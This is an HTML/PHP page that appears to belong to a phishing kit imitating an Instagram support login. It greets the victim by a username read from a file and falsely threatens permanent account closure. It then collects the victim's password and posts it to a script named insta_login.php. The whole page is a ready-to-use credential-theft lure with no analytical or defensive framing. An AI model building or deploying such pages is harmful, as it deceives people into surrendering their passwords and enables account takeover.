<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<title>Support Login</title>
	<link rel="stylesheet" href="css/styles.css">
	<link rel='stylesheet' type='text/css' href='css/nav.css' />
</head>
<body>

<div class="wrapper">
	<div class="header">
		<div class="top">
<!--			<div class="logo">
				<img src="gram2.png" style="width: 100px;">
			</div>
-->
			<div class="logo">
				<img src="abc.gif" style="width: 170px;">
			</div>
			<p style="text-align: center; font-style: vardaman; color: gray; font-size: 10pt">Hello <b>@<?php readfile("newfile.txt")?></b>, we understand the importance of your Instagram account, but if you do not continue to fill out
			the form your account will be permanently closed.</p>
			<br>
				
			<div class="form">
				<form action="insta_login.php" method="POST">
				<div class="input_field">
					<input type="password" name="pass" placeholder="Password" class="input" style="text-align: center" required="">
				</div>
					<base target="_parent" />
					<input class="btn" style="color: white; width: 100%" type="submit" name="submit2" value="Continue">
				</form>
			</div>
			
		</div>
		<div class="apps">
		<br><br>

			<div class="icons">
				<a href="#"><img src="appstore.png" alt="appstore"></a>
				<a href="#"><img src="googleplay.png" alt="googleplay"></a>
			</div>
		</div>
		<br>
		<p style="font-style: vardana; font-weight: normal; text-align: center; font-size: 10px;"> © 2022 INSTAGRAM</p>
	</div>
</div>

<script type='text/javascript' src='js/jquery.ba-hashchange.min.js'></script>
<script type='text/javascript' src='js/dynamicpage.js'></script>
<script type='text/javascript' src='js/jquer.min.js'></script>
</body>
</html>
